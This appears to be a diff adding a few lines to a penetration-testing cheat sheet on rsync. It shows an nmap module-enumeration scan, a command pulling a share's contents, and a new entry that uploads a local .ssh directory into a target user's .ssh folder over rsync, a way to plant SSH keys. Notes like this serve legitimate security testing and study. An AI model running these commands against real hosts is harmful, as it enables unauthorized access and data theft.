@@ -29,3 +29,8 @@ nmap -sV --script "rsync-list-modules" -p 873 192.168.181.126
 ```
 rsync -av rsync://192.168.181.126:873/fox ./fox
 ```
+
+- Write (Upload) (Put) via rsync
+```
+rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
+```
